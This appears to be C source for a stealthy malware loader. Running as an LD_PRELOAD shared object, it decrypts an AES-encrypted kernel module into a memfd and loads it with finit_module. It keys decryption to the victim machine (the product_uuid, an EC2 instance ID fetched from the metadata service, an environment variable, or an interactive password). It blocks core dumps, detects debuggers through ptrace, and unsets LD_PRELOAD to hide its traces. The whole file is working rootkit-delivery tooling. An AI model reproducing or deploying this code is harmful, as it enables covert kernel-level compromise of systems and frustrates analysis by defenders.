#define INSTANCEID_LENGTH 19
#define EC2_METADATA "http://169.254.169.254/latest/meta-data/instance-id"

char instanceidpassword[INSTANCEID_LENGTH + 1];

/* glibc wrapper
 */
static inline int
memfd_create(const char *name, unsigned int flags)
{
	return syscall(__NR_memfd_create, name, flags);
}

/* glibc wrapper
 */
static inline int
finit_module(int fd, const char *param_values, int flags)
{
	return syscall(__NR_finit_module, fd, param_values, flags);
}

void
loadlkm(int fd)
{
	if (!is_elf64(fd)) {
#ifdef DEBUG
		fprintf(stderr, "%s(): payload is not ELF 64-bit\n", __FUNCTION__);
#endif
		exit(1);
	}

#ifdef DEBUG
	fprintf(stderr, "%s(): loading kernel module\n", __FUNCTION__);
#endif

	if (finit_module(fd, "", 0) != 0) {
#ifdef DEBUG
		fprintf(stderr, "%s(): error inserting LKM: %s\n", __FUNCTION__,
		    strerror(errno));
#endif
		exit(1);
	}
}

static char
*getproduuid()
{
	FILE *product_uuid;

	char buf[UUID_LENGTH + 1];

	memset(buf, 0, sizeof(buf));

	product_uuid = fopen(produuid, "r");
	if (product_uuid == NULL) {
#ifdef DEBUG
		perror("fopen");
#endif
		return(NULL);
	}

	fgets(buf, sizeof(buf), product_uuid);
	fclose(product_uuid);

	return(strdup(buf));
}

bool
checklkmload()
{
	int fd = 0;

	char buf[2];

	fd = open(procmoddisable, O_RDONLY);
	if (fd < 0) {
#ifdef DEBUG
		perror("open");
#endif
		exit(1);
	}

	read(fd, buf, 1);
	close(fd);

	buf[1] = '\0';

	if (strcmp(buf, "1") == 0) {
#ifdef DEBUG
		fprintf(stderr, "%s(): kernel doesn't allow loading of LKMs\n",
		    __FUNCTION__);
#endif
		return(false);
	}

	return(true);
}

/*
 * disabling core dumps and ptrace() is not meant to prevent reverse engineering
 * it's meant to protect the password/key
 */
void
nocoredumps()
{
	struct rlimit r = { 0, 0 };

	if (setrlimit(RLIMIT_CORE, &r) != 0) {
#ifdef DEBUG
		perror("setrlimit");
#endif
		exit(1);
	}
}

void
ptraceself()
{
	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0) {
#ifdef DEBUG
		fprintf(stderr, "%s(): ptrace detected\n", __FUNCTION__);
#endif
		exit(1);
	}
}

static char
*getpathofself() {
	char *path;
	char *ldpreload;

	/* XXX: this assumes the shared object is loaded through the environment
	 *      but this assumption might break ELKM shared objects that are loaded
	 *      through /etc/ld.so.conf and /etc/ld.so.conf.d/
	 */
	ldpreload = secure_getenv("LD_PRELOAD");
	if (ldpreload == NULL) {
#ifdef DEBUG
		perror("getenv");
#endif
		exit(1);
	}

	path = realpath(ldpreload, 0);
	if (path == NULL) {
#ifdef DEBUG
		perror("realpath");
#endif
		exit(1);
	}

	unsetenv("LD_PRELOAD");

	return(path);
}

int
openelf(char *path)
{
	int fd = 0;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
#ifdef DEBUG
		perror("open");
#endif
		exit(1);
	}

	return(fd);
}

static char
*getinteractivepassword()
{
	char buf[1024];

	memset(buf, 0, sizeof(0));

#ifdef DEBUG
	fprintf(stderr, "%s(): enter decryption password: ", __FUNCTION__);
#endif

	fgets(buf, sizeof(buf), stdin);
	buf[strlen(buf) - 1] = '\0';

	return(strdup(buf));
}

void
check_ec2_instance_id(void *ptr, size_t size, size_t nmemb, void *stream)
{
	memset(instanceidpassword, 0, sizeof(instanceidpassword));
	memcpy(instanceidpassword, (char *)ptr, INSTANCEID_LENGTH);
	if (memcmp(instanceidpassword, "i-", 2) != 0) {
#ifdef DEBUG
		fprintf(stderr, "%s(): this is not an EC2 instance ID\n", __FUNCTION__);
#endif
		memset(instanceidpassword, 0, sizeof(instanceidpassword));
		return;
	}

	return;
}

bool
decryptwithenvironment(int fd, int memfd, char **envp)
{
	size_t envlen = 0;
	size_t passwordlen = 0;

	char *envpassword;

	if (envp[2] == NULL) {
#ifdef DEBUG
		fprintf(stderr, "%s(): can't get the environment\n", __FUNCTION__);
#endif
		exit(1);
	}

	envlen = strlen(envp[2]);
	passwordlen = envlen - strcspn(envp[2], "=") - 1;

	envpassword = malloc(passwordlen);
	memset(envpassword, 0, sizeof(*envpassword));

	memcpy(envpassword, &envp[2][envlen - passwordlen], passwordlen);
	envpassword[passwordlen] = '\0';

#ifdef DEBUG
	fprintf(stderr, "%s(): environment password: '%s'[%zu]\n", __FUNCTION__,
	    envpassword, passwordlen);
#endif

	if (!aes_crypt_fd(DECRYPT, envpassword, memfd, fd)) {
#ifdef DEBUG
		fprintf(stderr, "%s(): couldn't decrypt payload with password '%s'\n",
		    __FUNCTION__, envpassword);
#endif
		return(false);
	}

	memset(envpassword, 0, sizeof(*envpassword));
	free(envpassword);

	return(true);
}

bool
decryptwithproductuuid(int fd, int memfd)
{
	char *productuuidpassword;

	productuuidpassword = getproduuid();
	if (productuuidpassword == NULL)
		return(false);

#ifdef DEBUG
	fprintf(stderr, "%s(): product_uuid password: '%s'\n", __FUNCTION__,
	    productuuidpassword);
#endif

	if (!aes_crypt_fd(DECRYPT, productuuidpassword, memfd, fd)) {
#ifdef DEBUG
		fprintf(stderr, "%s(): couldn't decrypt payload with password '%s'\n",
		    __FUNCTION__, productuuidpassword);
#endif
		return(false);
	}

	memset(productuuidpassword, 0, sizeof(*productuuidpassword));

	return(true);
}

bool
decryptwithinteractive(int fd, int memfd)
{
	char *interactivepassword;

	interactivepassword = getinteractivepassword();

#ifdef DEBUG
	fprintf(stderr, "%s(): interactive password: '%s'[%zu]\n", __FUNCTION__,
	    interactivepassword, strlen(interactivepassword));
#endif

	if (!aes_crypt_fd(DECRYPT, interactivepassword, memfd, fd)) {
#ifdef DEBUG
		fprintf(stderr, "%s(): couldn't decrypt payload with password '%s'\n",
		    __FUNCTION__, interactivepassword);
#endif
		return(false);
	}

	memset(interactivepassword, 0, sizeof(*interactivepassword));

	return(true);
}

bool
decryptwithinstanceid(int fd, int memfd)
{
	CURL *curl;
 
	curl = curl_easy_init();
	if (!curl)
		return(false);

	curl_easy_setopt(curl, CURLOPT_URL, EC2_METADATA);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, check_ec2_instance_id);
	curl_easy_perform(curl);
	curl_easy_cleanup(curl);

	if (instanceidpassword[0] == '\0') {
#ifdef DEBUG
		fprintf(stderr, "%s(): instance_id password is empty\n",
		    __FUNCTION__);
#endif
		return(false);
	}

#ifdef DEBUG
	fprintf(stderr, "%s(): instance_id password: '%s'[%zu]\n",
	    __FUNCTION__, instanceidpassword, strlen(instanceidpassword));
#endif

	if (!aes_crypt_fd(DECRYPT, instanceidpassword, memfd, fd)) {
#ifdef DEBUG
		fprintf(stderr, "%s(): couldn't decrypt payload with password '%s'\n",
		    __FUNCTION__, instanceidpassword);
#endif
		return(false);
	}

	memset(instanceidpassword, 0, sizeof(*instanceidpassword));

	return(true);
}

